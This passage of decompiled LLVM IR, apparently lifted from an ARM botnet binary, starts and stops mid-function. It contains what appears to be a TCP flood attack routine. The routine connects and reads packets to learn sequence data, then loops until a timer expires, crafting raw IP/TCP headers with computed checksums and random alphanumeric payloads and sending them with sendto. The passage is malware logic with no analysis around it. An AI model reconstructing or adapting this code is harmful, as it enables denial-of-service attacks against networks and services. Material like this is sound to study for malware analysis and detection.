  %stack_var_-62.2 = phi i16 [ %v1_9b50, %dec_label_pc_9b50 ], [ %stack_var_-62.1, %.thread7 ]
  store i32 %v2_9888, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9890 = load i32, i32* @r8, align 4
  store i32 %v0_9890, i32* %r0.global-to-local, align 4
  %v3_9894 = call i32 @__libc_connect(i32 %v0_9890, i32 %v2_9888, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_989c = call i32 @__GI_time(i32* null)
  store i32 %v2_989c, i32* %r0.global-to-local, align 4
  store i32 %v2_98a0, i32* @r7, align 4
  store i32 %v2_989c, i32* @r4, align 4
  store i32 %v2_98a8, i32* @r6, align 4
  store i32 %v2_98ac, i32* @r5, align 4
  %v9_9900 = icmp eq i32 %tmp34, %v0_9b90
  %v4_9928 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_9900 to i32
  %v9_9914 = icmp eq i1 %v9_9900, false
  %v9_992c = icmp eq i32 %v3_9920, %v4_9928
  br label %dec_label_pc_98c4

dec_label_pc_98b4:                                ; preds = %.thread, %dec_label_pc_991c, %dec_label_pc_9944, %bb76
  %v2_98b4 = call i32 @__GI_time(i32* null)
  %v0_98b8 = load i32, i32* @r4, align 4
  %v2_98b8 = sub i32 %v2_98b4, %v0_98b8
  store i32 %v2_98b8, i32* %r0.global-to-local, align 4
  %v8_98c0 = icmp sgt i32 %v2_98b8, 10
  br i1 %v8_98c0, label %dec_label_pc_994c, label %dec_label_pc_98c4

dec_label_pc_98c4:                                ; preds = %dec_label_pc_98b4, %dec_label_pc_9888
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 %v2_98a8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_98d4 = load i32, i32* @sl, align 4
  store i32 %v0_98d4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v6_98e4 = call i32 @__libc_recvfrom(i32 %v0_98d4, i32 %v2_98a8, i32 256, i32 16384, i32 %v2_98a0, i32 %v2_98ac)
  store i32 %v6_98e4, i32* %r2.global-to-local, align 4
  %v7_98ec = icmp eq i32 %v6_98e4, -1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_98ec, label %dec_label_pc_9aec, label %dec_label_pc_98f8

dec_label_pc_98f8:                                ; preds = %dec_label_pc_98c4
  store i32 %v0_9b90, i32* @r1, align 4
  store i32 %tmp34, i32* @r3, align 4
  store i32 %., i32* @lr, align 4
  %tmp100 = icmp ult i32 %v6_98e4, 41
  br i1 %tmp100, label %.thread, label %bb76

.thread:                                          ; preds = %dec_label_pc_98f8
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_98b4

bb76:                                             ; preds = %dec_label_pc_98f8
  br i1 %v9_9914, label %dec_label_pc_98b4, label %dec_label_pc_991c

dec_label_pc_991c:                                ; preds = %bb76
  store i32 %v3_9920, i32* @lr, align 4
  store i32 %v2_9840, i32* @r3, align 4
  store i32 %v4_9928, i32* %r2.global-to-local, align 4
  br i1 %v9_992c, label %dec_label_pc_9934, label %dec_label_pc_98b4

dec_label_pc_9934:                                ; preds = %dec_label_pc_991c
  store i32 %v4_9934, i32* %r2.global-to-local, align 4
  store i32 %v1_9938, i32* @r3, align 4
  br i1 %v2_993c, label %dec_label_pc_9b84, label %dec_label_pc_9944

dec_label_pc_9944:                                ; preds = %dec_label_pc_9934
  br i1 %v2_9944, label %dec_label_pc_98b4, label %dec_label_pc_994c

dec_label_pc_994c:                                ; preds = %dec_label_pc_9944, %dec_label_pc_98b4
  %v0_994c = load i32, i32* @r8, align 4
  store i32 %v0_994c, i32* %r0.global-to-local, align 4
  %v1_9950 = call i32 @__GI___libc_close(i32 %v0_994c)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9960 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9960, i32* %r0.global-to-local, align 4
  %v3_9964 = icmp eq i32 %v3_9960, -1
  store i32 %v3_9960, i32* @r8, align 4
  br i1 %v3_9964, label %dec_label_pc_9970, label %dec_label_pc_9818

dec_label_pc_9970:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97fc
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_97fc ], [ %stack_var_-62.2, %dec_label_pc_994c ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_97fc ], [ %v0_9b90, %dec_label_pc_994c ]
  %v3_9970 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_9978 = add i32 %v3_9970, 1
  store i32 %v1_9978, i32* @r3, align 4
  store i32 %v1_9978, i32* %stack_var_-44, align 4
  %v5_9984 = icmp slt i32 %v1_9978, %arg2
  br i1 %v5_9984, label %dec_label_pc_97fc, label %dec_label_pc_9988.preheader

dec_label_pc_9988.preheader:                      ; preds = %.thread10, %dec_label_pc_9970, %dec_label_pc_97e0.dec_label_pc_9988.preheader_crit_edge
  %v1_99c0.pre-phi = phi i32 [ %.pre94, %dec_label_pc_97e0.dec_label_pc_9988.preheader_crit_edge ], [ %v1_9bec, %dec_label_pc_9970 ], [ %v1_9bec, %.thread10 ]
  %v4_9aa4.pre-phi = phi i32 [ %.pre, %dec_label_pc_97e0.dec_label_pc_9988.preheader_crit_edge ], [ %v4_9c2c, %dec_label_pc_9970 ], [ %v4_9c2c, %.thread10 ]
  %v3_99a0 = mul i32 %v6_9764, 65536
  %v1_99a4 = add i32 %v3_99a0, 1310720
  %tmp78 = udiv i32 %v1_99a4, 256
  %v3_99b0 = and i32 %tmp78, 65280
  %v2_9abc = icmp eq i32 %v1_9784, 0
  %v4_99b4 = udiv i32 %v1_99a4, 16777216
  %v5_99b4 = or i32 %v3_99b0, %v4_99b4
  %v1_99bc = add i32 %v6_9764, 20
  br label %dec_label_pc_9988

dec_label_pc_9988:                                ; preds = %dec_label_pc_9988.preheader, %dec_label_pc_9b6c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_97ec, label %dec_label_pc_9b6c, label %dec_label_pc_999c

dec_label_pc_999c:                                ; preds = %dec_label_pc_9988
  store i32 %v1_99a4, i32* %r2.global-to-local, align 4
  store i32 %v6_9764, i32* %ip.global-to-local, align 4
  store i32 %v3_99b0, i32* %r3.global-to-local, align 4
  store i32 %v5_99b4, i32* @sb, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_99bc, i32* @r8, align 4
  store i32 %v1_99c0.pre-phi, i32* @r7, align 4
  br label %dec_label_pc_9ab8

dec_label_pc_99c8:                                ; preds = %dec_label_pc_9ab8, %dec_label_pc_9ac4
  %v2_99cc = phi i32 [ %v7_9aa0, %dec_label_pc_9ab8 ], [ %v2_99cc.pre, %dec_label_pc_9ac4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_99cc = add i32 %v2_99cc, 10
  %v4_99cc = inttoptr i32 %v3_99cc to i16*
  store i16 0, i16* %v4_99cc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_99d4 = load i32, i32* @r5, align 4
  store i32 %v0_99d4, i32* @r0, align 4
  %v2_99d8 = call i32 @checksum_generic(i32 %v0_99d4, i32 20)
  %v3_99d8 = trunc i32 %v2_99d8 to i16
  store i32 %v2_99d8, i32* %r0.global-to-local, align 4
  %v3_99dc = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_95e0, i32* %ip.global-to-local, align 4
  %v3_99e4 = mul i32 %v3_99dc, 16
  %v2_99e8 = add i32 %v3_99e4, %v2_95e0
  store i32 %v2_99e8, i32* %r1.global-to-local, align 4
  %v1_99ec = add i32 %v2_99e8, 4
  %v2_99ec = inttoptr i32 %v1_99ec to i32*
  %v3_99ec = load i32, i32* %v2_99ec, align 4
  %v3_99f0 = mul i32 %v3_99ec, 65536
  store i32 %v3_99f0, i32* %ip.global-to-local, align 4
  %tmp79 = mul i32 %v3_99ec, 256
  %v1_99f8 = and i32 %tmp79, and (i32 ptrtoint (i32* @global_var_ff00.28 to i32), i32 16776960)
  %tmp80 = udiv i32 %v3_99ec, 256
  %v4_99fc = urem i32 %tmp80, 256
  %v5_99fc = or i32 %v4_99fc, %v1_99f8
  store i32 %v5_99fc, i32* %r3.global-to-local, align 4
  %v1_9a00 = add i32 %v3_99ec, 1
  store i32 %v1_9a00, i32* %r2.global-to-local, align 4
  store i32 %v1_9a00, i32* %v2_99ec, align 4
  %v0_9a08 = load i32, i32* %r3.global-to-local, align 4
  %v1_9a08 = load i32, i32* @r6, align 4
  %v2_9a08 = add i32 %v1_9a08, 4
  %v3_9a08 = inttoptr i32 %v2_9a08 to i32*
  store i32 %v0_9a08, i32* %v3_9a08, align 4
  %v0_9a0c = load i32, i32* %r1.global-to-local, align 4
  %v1_9a0c = add i32 %v0_9a0c, 8
  %v2_9a0c = inttoptr i32 %v1_9a0c to i32*
  %v3_9a0c = load i32, i32* %v2_9a0c, align 4
  %tmp81 = mul i32 %v3_9a0c, 256
  %v1_9a18 = and i32 %tmp81, and (i32 ptrtoint (i32* @global_var_ff00.28 to i32), i32 16776960)
  %tmp82 = udiv i32 %v3_9a0c, 256
  %v4_9a1c = urem i32 %tmp82, 256
  %v5_9a1c = or i32 %v4_9a1c, %v1_9a18
  store i32 %v5_9a1c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v3_9a24 = load i32, i32* @r5, align 4
  %v4_9a24 = add i32 %v3_9a24, 10
  %v5_9a24 = inttoptr i32 %v4_9a24 to i16*
  store i16 %v3_99d8, i16* %v5_9a24, align 2
  %v0_9a28 = load i32, i32* %r3.global-to-local, align 4
  %v1_9a28 = load i32, i32* @r6, align 4
  %v2_9a28 = add i32 %v1_9a28, 8
  %v3_9a28 = inttoptr i32 %v2_9a28 to i32*
  store i32 %v0_9a28, i32* %v3_9a28, align 4
  %v0_9a2c = load i32, i32* @lr, align 4
  %v1_9a2c = trunc i32 %v0_9a2c to i16
  %v2_9a2c = load i32, i32* @r6, align 4
  %v3_9a2c = add i32 %v2_9a2c, 16
  %v4_9a2c = inttoptr i32 %v3_9a2c to i16*
  store i16 %v1_9a2c, i16* %v4_9a2c, align 2
  %v0_9a30 = load i32, i32* @r6, align 4
  store i32 %v0_9a30, i32* @r1, align 4
  %v0_9a34 = load i32, i32* @sb, align 4
  store i32 %v0_9a34, i32* %r2.global-to-local, align 4
  %v0_9a38 = load i32, i32* @r8, align 4
  store i32 %v0_9a38, i32* %r3.global-to-local, align 4
  %v0_9a3c = load i32, i32* @r5, align 4
  store i32 %v0_9a3c, i32* %r0.global-to-local, align 4
  %v4_9a40 = call i32 @checksum_tcpudp(i32 %v0_9a3c, i32 %v0_9a30, i32 %v0_9a34, i32 %v0_9a38)
  %v5_9a40 = trunc i32 %v4_9a40 to i16
  store i32 %v4_9a40, i32* %r0.global-to-local, align 4
  %v3_9a44 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9a44, i32* %r3.global-to-local, align 4
  %v3_9a48 = mul i32 %v3_9a44, 32
  store i32 %v3_9a48, i32* %lr.global-to-local, align 4
  %v3_9a4c = load i32, i32* @r6, align 4
  %v4_9a4c = add i32 %v3_9a4c, 16
  %v5_9a4c = inttoptr i32 %v4_9a4c to i16*
  store i16 %v5_9a40, i16* %v5_9a4c, align 2
  %v0_9a50 = load i32, i32* %lr.global-to-local, align 4
  %v1_9a50 = load i32, i32* %r3.global-to-local, align 4
  %tmp101 = mul i32 %v1_9a50, -8
  %v5_9a50 = add i32 %v0_9a50, %tmp101
  store i32 %v5_9a50, i32* %lr.global-to-local, align 4
  %v0_9a54 = load i32, i32* @r6, align 4
  %v1_9a54 = add i32 %v0_9a54, 2
  %v2_9a54 = inttoptr i32 %v1_9a54 to i16*
  %v3_9a54 = load i16, i16* %v2_9a54, align 2
  %v4_9a54 = zext i16 %v3_9a54 to i32
  store i32 %v4_9a54, i32* @r6, align 4
  %v1_9a58 = load i32, i32* @fp, align 4
  %v2_9a58 = add i32 %v1_9a58, %v5_9a50
  store i32 %v2_9a58, i32* @lr, align 4
  %v3_9a5c = add i32 %v2_9a58, 2
  %v4_9a5c = inttoptr i32 %v3_9a5c to i16*
  store i16 %v3_9a54, i16* %v4_9a5c, align 2
  %v0_9a60 = load i32, i32* @r5, align 4
  store i32 %v0_9a60, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9a6c = load i32, i32* @sl, align 4
  store i32 %v0_9a6c, i32* %r0.global-to-local, align 4
  %v0_9a70 = load i32, i32* @r7, align 4
  store i32 %v0_9a70, i32* %r2.global-to-local, align 4
  %v0_9a74 = load i32, i32* @lr, align 4
  %v6_9a7c = call i32 @__libc_sendto(i32 %v0_9a6c, i32 %v0_9a60, i32 %v0_9a70, i32 16384, i32 %v0_9a74, i32 16)
  %v3_9a80 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9a80, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v1_9a88 = add i32 %v3_9a80, 1
  store i32 %v1_9a88, i32* %r0.global-to-local, align 4
  store i32 %v1_9a88, i32* %stack_var_-44, align 4
  %v7_9a94 = icmp slt i32 %v1_9a88, %arg2
  br i1 %v7_9a94, label %dec_label_pc_9ab8, label %dec_label_pc_9b6c

dec_label_pc_9ab8:                                ; preds = %dec_label_pc_999c, %dec_label_pc_99c8
  %v1_9aa0 = phi i32 [ %v1_9a88, %dec_label_pc_99c8 ], [ 0, %dec_label_pc_999c ]
  store i32 %v2_95f0, i32* @lr, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_9aa0 = mul i32 %v1_9aa0, 4
  %v5_9aa0 = add i32 %v4_9aa0, %v2_95f0
  %v6_9aa0 = inttoptr i32 %v5_9aa0 to i32*
  %v7_9aa0 = load i32, i32* %v6_9aa0, align 4
  store i32 %v7_9aa0, i32* @r5, align 4
  store i32 %v4_9aa4.pre-phi, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v1_9ab0 = add i32 %v7_9aa0, 20
  store i32 %v1_9ab0, i32* @r6, align 4
  store i32 %v1_9784, i32* %r1.global-to-local, align 4
  br i1 %v2_9abc, label %dec_label_pc_99c8, label %dec_label_pc_9ac4

dec_label_pc_9ac4:                                ; preds = %dec_label_pc_9ab8
  %v1_9ac4 = add i32 %v7_9aa0, 40
  store i32 %v1_9ac4, i32* @r4, align 4
  store i32 %v1_9ac4, i32* %r0.global-to-local, align 4
  store i32 %v6_9764, i32* %r1.global-to-local, align 4
  %v2_9ad0 = call i32 @rand_alphastr(i32 %v1_9ac4, i32 %v6_9764)
  store i32 %v2_9ad0, i32* %r0.global-to-local, align 4
  store i32 %v6_9764, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9adc = load i32, i32* @r4, align 4
  %v4_9adc = add i32 %v2_9adc, %v6_9764
  %v5_9adc = inttoptr i32 %v4_9adc to i8*
  store i8 0, i8* %v5_9adc, align 1
  %v2_99cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_99c8

dec_label_pc_9ae4:                                ; preds = %dec_label_pc_97b8
  %v0_9ae4 = load i32, i32* @sl, align 4
  store i32 %v0_9ae4, i32* %r0.global-to-local, align 4
  %v1_9ae8 = call i32 @__GI___libc_close(i32 %v0_9ae4)
  store i32 %v1_9ae8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9aec

dec_label_pc_9aec:                                ; preds = %dec_label_pc_98c4, %dec_label_pc_9b6c, %entry, %dec_label_pc_9ae4
  %v1_9af4 = phi i32 [ %v3_97a8, %entry ], [ %v1_9ae8, %dec_label_pc_9ae4 ], [ %v2_9b70, %dec_label_pc_9b6c ], [ 0, %dec_label_pc_98c4 ]
  store i32 %v3_95b4, i32* %r4.global-to-local, align 4
  store i32 %v27_95b4, i32* %lr.global-to-local, align 4
  ret i32 %v1_9af4

dec_label_pc_9af8:                                ; preds = %bb72
  %v1_9af8 = add i32 %v4_985c, 16
  %v2_9af8 = inttoptr i32 %v1_9af8 to i32*
  %v3_9af8 = load i32, i32* %v2_9af8, align 4
  store i32 %v3_9af8, i32* @r4, align 4
  %v0_9afc = call i32 @rand_next()
  store i32 %v0_9afc, i32* %r0.global-to-local, align 4
  %v3_9b00 = load i32, i32* %stack_var_-44, align 4
  %v5_9b08 = mul i32 %v3_9b00, 24
  %v0_9b0c = load i32, i32* @r4, align 4
  %v1_9b0c = and i32 %v0_9b0c, 16711680
  store i32 %v1_9b0c, i32* %ip.global-to-local, align 4
  %v3_9b10 = udiv i32 %v0_9b0c, 16777216
  %v4_9b14 = udiv i32 %v1_9b0c, 256
  %v5_9b14 = or i32 %v4_9b14, %v3_9b10
  store i32 %v5_9b14, i32* %r2.global-to-local, align 4
  %v1_9b18 = load i32, i32* @fp, align 4
  %v2_9b18 = add i32 %v1_9b18, %v5_9b08
  store i32 %v2_9b18, i32* %r1.global-to-local, align 4
  %v1_9b1c = and i32 %v0_9b0c, ptrtoint (i32* @global_var_ff00.28 to i32)
  store i32 %v1_9b1c, i32* %r3.global-to-local, align 4
  %v1_9b20 = add i32 %v2_9b18, 20
  %v2_9b20 = inttoptr i32 %v1_9b20 to i8*
  %v3_9b20 = load i8, i8* %v2_9b20, align 1
  %v4_9b20 = zext i8 %v3_9b20 to i32
  store i32 %v4_9b20, i32* %ip.global-to-local, align 4
  %v4_9b24 = mul i32 %v1_9b1c, 256
  %v4_9b28 = mul i32 %v0_9b0c, 16777216
  %v5_9b24 = or i32 %v4_9b24, %v4_9b28
  %v5_9b28 = or i32 %v5_9b24, %v5_9b14
  %v7_9b2c = lshr i32 %v0_9afc, %v4_9b20
  %v8_9b2c = add i32 %v7_9b2c, %v5_9b28
  store i32 %v8_9b2c, i32* %r2.global-to-local, align 4
  %v1_9b30 = and i32 %v8_9b2c, 16711680
  store i32 %v1_9b30, i32* %r0.global-to-local, align 4
  %v1_9b3c = and i32 %v8_9b2c, 65280
  store i32 %v1_9b3c, i32* %r1.global-to-local, align 4
  %v5_9b44 = call i32 @llvm.bswap.i32(i32 %v8_9b2c)
  store i32 %v5_9b44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9864

dec_label_pc_9b50:                                ; preds = %dec_label_pc_9864
  %v0_9b50 = call i32 @rand_next()
  %v1_9b50 = trunc i32 %v0_9b50 to i16
  store i32 %v0_9b50, i32* %r0.global-to-local, align 4
  store i32 %v2_9840, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9888

dec_label_pc_9b6c:                                ; preds = %dec_label_pc_99c8, %dec_label_pc_9988
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9b70 = call i32 @__GI_time(i32* null)
  store i32 %v2_9b70, i32* %r0.global-to-local, align 4
  store i32 %v2_9794, i32* %r2.global-to-local, align 4
  %v6_9b7c = icmp slt i32 %v2_9794, %v2_9b70
  br i1 %v6_9b7c, label %dec_label_pc_9aec, label %dec_label_pc_9988

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9934
  %v3_9b84 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9b84, i32* @r5, align 4
  store i32 %v2_95e0, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r0.global-to-local, align 4
  %v5_9b90 = mul i32 %v3_9b84, 16
  %v6_9b90 = add i32 %v5_9b90, %v2_95e0
  %v7_9b90 = inttoptr i32 %v6_9b90 to i32*
  store i32 %v0_9b90, i32* %v7_9b90, align 4
  %v0_9b94 = load i32, i32* %r0.global-to-local, align 4
  %v1_9b94 = add i32 %v0_9b94, 4
  %v2_9b94 = inttoptr i32 %v1_9b94 to i32*
  %v3_9b94 = load i32, i32* %v2_9b94, align 4
  %v1_9b98 = and i32 %v3_9b94, 16711680
  store i32 %v1_9b98, i32* %r0.global-to-local, align 4
  %v3_9b9c = udiv i32 %v3_9b94, 16777216
  %v1_9ba0 = and i32 %v3_9b94, ptrtoint (i32* @global_var_ff00.28 to i32)
  %v4_9ba4 = udiv i32 %v1_9b98, 256
  %v4_9ba8 = mul i32 %v1_9ba0, 256
  %v4_9bac = mul i32 %v3_9b94, 16777216
  %v5_9ba4 = or i32 %v4_9bac, %v3_9b9c
  %v5_9ba8 = or i32 %v5_9ba4, %v4_9ba4
  %v5_9bac = or i32 %v5_9ba8, %v4_9ba8
  store i32 %v5_9bac, i32* %r3.global-to-local, align 4
  store i32 %v2_95e0, i32* %r1.global-to-local, align 4
  %v0_9bb4 = load i32, i32* @r5, align 4
  %v3_9bb4 = mul i32 %v0_9bb4, 16
  %v2_9bb8 = add i32 %v3_9bb4, %v2_95e0
  store i32 %v2_9bb8, i32* %ip.global-to-local, align 4
  %v2_9bbc = add i32 %v2_9bb8, 4
  %v3_9bbc = inttoptr i32 %v2_9bbc to i32*
  store i32 %v5_9bac, i32* %v3_9bbc, align 4
  store i32 %stack_var_-340.0.ph, i32* %r2.global-to-local, align 4
  %v1_9bc4 = add i32 %stack_var_-340.0.ph, 8
  %v2_9bc4 = inttoptr i32 %v1_9bc4 to i32*
  %v3_9bc4 = load i32, i32* %v2_9bc4, align 4
  %v3_9bcc = udiv i32 %v3_9bc4, 16777216
  %v1_9bd0 = and i32 %v3_9bc4, ptrtoint (i32* @global_var_ff00.28 to i32)
  store i32 %v1_9bd0, i32* %r2.global-to-local, align 4
  %v1_9bc8 = udiv i32 %v3_9bc4, 256
  %v4_9bd4 = and i32 %v1_9bc8, 65280
  %v4_9bd8 = mul i32 %v1_9bd0, 256
  %v4_9bdc = mul i32 %v3_9bc4, 16777216
  %v5_9bd4 = or i32 %v4_9bdc, %v3_9bcc
  %v5_9bd8 = or i32 %v5_9bd4, %v4_9bd4
  %v5_9bdc = or i32 %v5_9bd8, %v4_9bd8
  store i32 %v5_9bdc, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v6_9764, i32* %r0.global-to-local, align 4
  %v1_9be8 = add i32 %stack_var_-340.0.ph, 2
  %v2_9be8 = inttoptr i32 %v1_9be8 to i16*
  %v3_9be8 = load i16, i16* %v2_9be8, align 2
  %v4_9be8 = zext i16 %v3_9be8 to i32
  store i32 %v4_9be8, i32* %r1.global-to-local, align 4
  store i32 %v1_9bec, i32* @r4, align 4
  %v2_9bf0 = load i32, i32* %ip.global-to-local, align 4
  %v3_9bf0 = add i32 %v2_9bf0, 12
  %v4_9bf0 = inttoptr i32 %v3_9bf0 to i16*
  store i16 %v3_9be8, i16* %v4_9bf0, align 2
  %v0_9bf4 = load i32, i32* @lr, align 4
  %v1_9bf4 = trunc i32 %v0_9bf4 to i16
  %v2_9bf4 = load i32, i32* %ip.global-to-local, align 4
  %v3_9bf4 = add i32 %v2_9bf4, 14
  %v4_9bf4 = inttoptr i32 %v3_9bf4 to i16*
  store i16 %v1_9bf4, i16* %v4_9bf4, align 2
  %v0_9bf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9bf8 = load i32, i32* %ip.global-to-local, align 4
  %v2_9bf8 = add i32 %v1_9bf8, 8
  %v3_9bf8 = inttoptr i32 %v2_9bf8 to i32*
  store i32 %v0_9bf8, i32* %v3_9bf8, align 4
  %v0_9bfc = load i32, i32* @r4, align 4
  store i32 %v0_9bfc, i32* @r0, align 4
  %v0_9c00 = call i32 @malloc()
  store i32 %v0_9c00, i32* %r0.global-to-local, align 4
  store i32 %v2_95f0, i32* %r3.global-to-local, align 4
  %v2_9c0c = load i32, i32* @r5, align 4
  %v5_9c0c = mul i32 %v2_9c0c, 4
  %v6_9c0c = add i32 %v5_9c0c, %v2_95f0
  %v7_9c0c = inttoptr i32 %v6_9c0c to i32*
  store i32 %v0_9c00, i32* %v7_9c0c, align 4
  %v3_9c10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9c10, i32* %r2.global-to-local, align 4
  %v0_9c14 = load i32, i32* %r3.global-to-local, align 4
  %v4_9c14 = mul i32 %v3_9c10, 4
  %v5_9c14 = add i32 %v0_9c14, %v4_9c14
  %v6_9c14 = inttoptr i32 %v5_9c14 to i32*
  %v7_9c14 = load i32, i32* %v6_9c14, align 4
  store i32 %v7_9c14, i32* %ip.global-to-local, align 4
  %v1_9c18 = inttoptr i32 %v7_9c14 to i8*
  %v2_9c18 = load i8, i8* %v1_9c18, align 1
  %tmp102 = urem i8 %v2_9c18, 16
  %v1_9c1c = zext i8 %tmp102 to i32
  %v1_9c20 = or i32 %v1_9c1c, 64
  store i32 %v1_9c20, i32* %r3.global-to-local, align 4
  %v1_9c24 = trunc i32 %v1_9c20 to i8
  store i8 %v1_9c24, i8* %v1_9c18, align 1
  %v0_9c28 = load i32, i32* %ip.global-to-local, align 4
  %v1_9c28 = inttoptr i32 %v0_9c28 to i8*
  %v2_9c28 = load i8, i8* %v1_9c28, align 1
  store i32 %v4_9c2c, i32* %lr.global-to-local, align 4
  %v1_9c30 = and i8 %v2_9c28, -16
  %v1_9c3c = or i8 %v1_9c30, 5
  %v0_9c40 = load i32, i32* @r4, align 4
  %v3_9c40 = mul i32 %v0_9c40, 65536
  store i32 %v3_9c40, i32* %r4.global-to-local, align 4
  store i32 %v5_9c44, i32* %r1.global-to-local, align 4
  store i32 %v1_9670, i32* %r0.global-to-local, align 4
  store i8 %v1_9c3c, i8* %v1_9c28, align 1
  %v0_9c50 = load i32, i32* %r1.global-to-local, align 4
  %v1_9c50 = trunc i32 %v0_9c50 to i16
  %v2_9c50 = load i32, i32* %ip.global-to-local, align 4
  %v3_9c50 = add i32 %v2_9c50, 4
  %v4_9c50 = inttoptr i32 %v3_9c50 to i16*
  store i16 %v1_9c50, i16* %v4_9c50, align 2
  %v0_9c54 = load i32, i32* %r4.global-to-local, align 4
  %v3_9c54 = udiv i32 %v0_9c54, 256
  %v1_9c5c = and i32 %v3_9c54, ptrtoint (i32* @global_var_ff00.28 to i32)
  store i32 %v1_9c5c, i32* %r2.global-to-local, align 4
  %v2_9c60 = load i32, i32* %ip.global-to-local, align 4
  %v3_9c60 = add i32 %v2_9c60, 1
  %v4_9c60 = inttoptr i32 %v3_9c60 to i8*
  store i8 %v5_9628, i8* %v4_9c60, align 1
  %v0_9c64 = load i32, i32* %r2.global-to-local, align 4
  %v1_9c64 = load i32, i32* %r4.global-to-local, align 4
  %v4_9c64 = udiv i32 %v1_9c64, 16777216
  %v5_9c64 = or i32 %v4_9c64, %v0_9c64
  %v1_9c68 = trunc i32 %v5_9c64 to i16
  %v2_9c68 = load i32, i32* %ip.global-to-local, align 4
  %v3_9c68 = add i32 %v2_9c68, 2
  %v4_9c68 = inttoptr i32 %v3_9c68 to i16*
  store i16 %v1_9c68, i16* %v4_9c68, align 2
  %v0_9c70 = load i32, i32* %ip.global-to-local, align 4
  %v1_9c70 = add i32 %v0_9c70, 20
  store i32 %v1_9c70, i32* %r3.global-to-local, align 4
  %v3_9c74 = add i32 %v0_9c70, 8
  %v4_9c74 = inttoptr i32 %v3_9c74 to i8*
  store i8 %v5_9660, i8* %v4_9c74, align 1
  %v0_9c78 = load i32, i32* %r3.global-to-local, align 4
  %v2_9c80 = load i32, i32* %ip.global-to-local, align 4
  %v3_9c80 = add i32 %v2_9c80, 9
  %v4_9c80 = inttoptr i32 %v3_9c80 to i8*
  store i8 6, i8* %v4_9c80, align 1
  store i32 ptrtoint (i32* @global_var_23a4c.55 to i32), i32* %r2.global-to-local, align 4
  %v2_9c88 = load i32, i32* @global_var_23a4c.55, align 4
  store i32 %v2_9c88, i32* %r1.global-to-local, align 4
  %v1_9c8c = load i32, i32* %ip.global-to-local, align 4
  %v2_9c8c = add i32 %v1_9c8c, 12
  %v3_9c8c = inttoptr i32 %v2_9c8c to i32*
  store i32 %v2_9c88, i32* %v3_9c8c, align 4
  %v0_9c90 = load i32, i32* %r0.global-to-local, align 4
  %v2_9c90 = icmp eq i32 %v0_9c90, 0
  %v3_9c94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9c94, i32* %r3.global-to-local, align 4
  store i32 %v2_95e0, i32* %r0.global-to-local, align 4
  br i1 %v2_9c90, label %.thread10, label %bb83

bb83:                                             ; preds = %dec_label_pc_9b84
  store i32 64, i32* %lr.global-to-local, align 4
  %v3_9ca0 = load i32, i32* %ip.global-to-local, align 4
  %v4_9ca0 = add i32 %v3_9ca0, 6
  %v5_9ca0 = inttoptr i32 %v4_9ca0 to i16*
  store i16 64, i16* %v5_9ca0, align 2
  %v0_9ca4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_9ca4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_9b84, %bb83
  %v0_9ca8 = phi i32 [ %v3_9c94, %dec_label_pc_9b84 ], [ %v1_9ca4.pre, %bb83 ]
  %v1_9cac = phi i32 [ %v2_95e0, %dec_label_pc_9b84 ], [ %v0_9ca4.pre, %bb83 ]
  %v4_9ca4 = mul i32 %v0_9ca8, 16
  %v5_9ca4 = add i32 %v4_9ca4, %v1_9cac
  %v6_9ca4 = inttoptr i32 %v5_9ca4 to i32*
  %v7_9ca4 = load i32, i32* %v6_9ca4, align 4
  store i32 %v7_9ca4, i32* %r2.global-to-local, align 4
  store i32 %v5_9ca4, i32* %r3.global-to-local, align 4
  %v1_9cb0 = load i32, i32* %ip.global-to-local, align 4
  %v2_9cb0 = add i32 %v1_9cb0, 16
